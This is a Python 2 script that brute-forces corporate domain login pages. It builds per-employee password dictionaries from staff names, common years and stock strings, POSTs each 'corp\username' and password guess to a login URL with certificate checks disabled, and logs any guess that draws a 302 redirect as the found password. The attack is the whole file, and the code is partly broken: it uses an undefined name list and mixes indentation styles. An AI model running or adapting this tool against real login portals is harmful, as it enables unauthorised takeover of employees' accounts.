#*-*coding:utf-8*-*
import Cpass
import re
import pycurl
import string
import StringIO
import urllib
import pdb
import sys

def headerCookie(buf):
#	print buf
	print ">",
def httpsclient(post_data_dic):
	curl=pycurl.Curl()
	f=StringIO.StringIO()
	curl.setopt(pycurl.URL,"url")#enter url like:www.xxx.com/login.php

	curl.setopt(pycurl.WRITEFUNCTION,f.write)
	curl.setopt(pycurl.SSL_VERIFYPEER,0)
	curl.setopt(pycurl.SSL_VERIFYHOST,0)
	curl.setopt(pycurl.HEADERFUNCTION,headerCookie)
	curl.setopt(pycurl.COOKIE,cookie)
	curl.setopt(pycurl.POSTFIELDS,urllib.urlencode(post_data_dic))
	curl.perform()

	backinfo=''

	if curl.getinfo(pycurl.RESPONSE_CODE)==200:
		print "Not that pass:"
		backinfo=f.getvalue()
	elif curl.getinfo(pycurl.RESPONSE_CODE)==302:
		print "Yes you are very lucky,the true password is:%s"%domain_password
		report_file="./report/report.txt"
		report=open(report_file,'a+')
		report_info=domain_username+" --> "+domain_password
		report.write(report_info+"\n")
		sys.exit(0)
	curl.close()
#	print backinfo

def tiqu():
        namelist=open("namelist.txt",'rw').readlines()
        for i in namelist:
                i=str(i).replace("\n","")
                full_name=string.lower(i)
                patt=re.compile(r'[A-Z]+')
                res=patt.findall(i)
                nick_name=""
                for j in res:
                        nick_name += j
                print i,full_name,nick_name

if __name__=="__main__":
#	pdb.set_trace()
	cookie=""#enter you cookie
	spe_nums=["2013","2014","2015","2016","2017","1234","123",]
        spe_chars="@#$%&*/!"
        spe_strs=["abc","ABC","nihao","password","abcd","Abc","qwe","pwd"]
        others=["welcom@1","Password@1234","woaini@1234","abc@12345678",]	
        for full_name in namelist:
                full_name=str(full_name).replace("\n","")
                patt=re.compile(r'[A-Z]+')
                res=patt.findall(full_name)
                nick_name=""
                for j in res:
                        nick_name += j
                print "[*]"+full_name,nick_name+"corp\\"+string.lower(full_name)+"***"
		
		passwd_file="./passdict/"+string.lower(full_name)+".txt"
		passlist=open(passwd_file,'w+')
		Cpass.fullname_C(full_name,passlist)
        	Cpass.other_C(passlist)
        	Cpass.spe_char_C(passlist)
        	Cpass.nickname_C(nick_name,passlist)
        	passlist.close()
	
		domain_username="corp\\"+string.lower(full_name)
		passlist=open(passwd_file,'rw').readlines()
		for pass1 in passlist:
			pass1=str(pass1).replace("\n","")
			domain_password=pass1
			print domain_password,
			post_data_dic={"Username":domain_username,"Password":domain_password}
			httpsclient(post_data_dic)
	namelist.close()
	passlist.close()
